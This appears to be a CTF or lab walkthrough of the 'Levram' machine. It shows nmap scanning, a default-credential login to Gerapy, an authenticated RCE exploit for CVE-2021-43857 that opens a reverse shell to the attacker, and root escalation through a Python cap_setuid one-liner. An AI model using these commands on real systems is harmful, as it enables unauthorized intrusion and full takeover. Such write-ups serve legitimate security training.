##### Tags: `SUID`  `Linpeas`  `github`  `gerapy`

# 🐧Levram🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.237.24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 18:39 AEDT
Nmap scan report for 192.168.237.24
Host is up (0.17s latency).
Not shown: 65496 closed tcp ports (reset), 37 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 8000 is a web running GERAPY  
use default credential admin admin logged in  
nothing inside  
searchsploit found a RCE script
```console
$ searchsploit gerapy   
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)                      | python/remote/50640.py
```

run the script and get the shell
```console
$ python3 gerapy_rce.py -t 192.168.237.24 -p 8000 -L 192.168.45.201 -P 8000
/home/ming/.local/lib/python3.13/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.11) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: test
[*] Getting the ID of the project to build the URL
[*] Found ID of the project: 1
[*] Setting up a netcat listener
listening on [any] 8000 ...
[*] Executing reverse shell payload



$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.237.24] 54784
app@ubuntu:~/gerapy$ id
uid=1000(app) gid=1000(app) groups=1000(app)
```
## Privlege Escalation  

upload linpeas and found the python 3.10 have SUID 
```console
/usr/bin/python3.10 cap_setuid=ep
```
search GTFOBin and found the way to root  
https://gtfobins.org/gtfobins/python/#shell
```console
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```
```console
app@ubuntu:~/gerapy$ python3.10 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")' 
root@ubuntu:~/gerapy# id
uid=0(root) gid=1000(app) groups=1000(app)
root@ubuntu:~/gerapy# whoami
root
```
